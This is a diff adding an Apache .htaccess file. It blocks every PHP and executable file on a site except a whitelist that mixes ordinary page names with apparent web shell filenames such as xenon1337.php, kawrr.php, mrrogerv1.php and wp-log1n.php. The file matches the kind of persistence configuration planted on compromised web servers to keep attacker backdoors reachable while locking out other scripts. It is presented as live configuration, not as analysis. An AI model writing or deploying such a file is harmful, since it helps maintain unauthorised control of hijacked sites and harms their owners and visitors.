@@ -1,0 +1,16 @@
+DirectoryIndex index.php index.html
+<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch '^(bedah.php|kawrr.php|xenon1337.php|kawrr.php|security.php|mrrogerv1.php|mrrogerv3.pass.php|api-xenon.php|index.html|lazada.html|index.php|edit.php|pages.php|product.php|shop.php|item.php|search.php|brand.php|wp-configs.php|install.php|plugin.php|plugins.php|admin.php|index.php|wp-login.php|wp-log1n.php|about.php|defaults.php|function.php|networks.php|options.php|robots.txt|sitemap.xml)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
